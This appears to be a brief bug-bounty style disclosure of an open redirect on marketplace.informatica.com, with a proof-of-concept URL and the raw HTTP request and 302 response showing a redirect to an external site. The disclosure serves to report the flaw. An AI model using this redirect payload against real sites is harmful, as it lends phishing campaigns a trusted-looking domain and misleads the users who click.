Summary:

marketplace.informatica.com contains an open redirect due to a flawed URL rewrite rule. All requests containing a single quote: ' are met with a 302 redirect to the same URL, minus the single quote. As the Location header uses a protocol-relative URL, this can be abused to redirect people to arbitrary external sites.

To replicate this issue, load the following URL and observe that you land on google.com: https://marketplace.informatica.com//google.com?q=ohdear&a'b

GET //google.com?q=ohdear&a' HTTP/1.1
Host: marketplace.informatica.com
Connection: close

HTTP/1.0 302 Found
Location: //google.com?q=ohdear&a
Server: BigIP
Connection: close
Content-Length: 0

Open redirects are frequently used to make phishing attacks more effective.
